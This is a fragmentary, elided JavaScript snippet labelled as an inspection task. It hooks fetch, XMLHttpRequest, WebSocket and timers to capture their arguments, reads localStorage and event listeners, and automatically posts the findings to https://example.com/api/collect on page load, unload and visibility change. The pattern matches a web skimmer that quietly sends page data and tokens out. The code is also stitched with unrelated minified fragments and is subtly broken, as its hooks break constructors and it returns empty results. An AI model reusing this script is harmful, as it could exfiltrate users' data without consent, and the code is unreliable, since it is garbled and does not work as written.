...
(function () {
  ...
  */
  ...
  function jsHookInspector() {
    const jsHooks = ['setTimeout', 'setInterval', 'fetch', 'XMLHttpRequest', 'WebSocket'];
    let findings = {};
    jsHooks.forEach(hook => {
      const _origin = window[hook];
      window[hook] = (...args) => {
        findings[hook] = {
          type: typeof _origin,
          value: args
        };
        return _origin.apply(window, args);
      };
    });
    return findings;
  }
  ...
  P[11] = !0;
  P[14] = !0;
  function localStorageInspector() {
    const findings = {};
  ...
  function eventListenerInspector() {
    const findings = {};
  ...
  async function sendFindingsToBackend(apiEndpoint, findings) {
  ...
  function inspectionTask() {
    const findings = {
      ...
      jsHooks: jsHookInspector(),
      localStorage: localStorageInspector(),
      eventListeners: eventListenerInspector()
    };
    let totalCount = 0;
    for (const type in findings) {
      totalCount += Object.keys(findings[type]).length;
    }
    if (totalCount > 0) {
      console.group(`Inspection Results - ${totalCount} new properties found:`);
      for (const type in findings) {
        for (const key in findings[type]) {
          console.log(`${type}${key}: ${JSON.stringify(findings[type][key])}`);
        }
      }
      console.groupEnd();
      sendFindingsToBackend("https://example.com/api/collect", findings);
    } else {
  ...
  window.addEventListener("load", inspectionTask);
  function Pw(a, b) {
  ...
  ;
  window.addEventListener("beforeunload", inspectionTask);
  var sx = function () {};
  var sf = {};
  ...
  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "visible") {
      console.info("Visibility state changed, re-running inspection task.");
      inspectionTask();
    }
  });
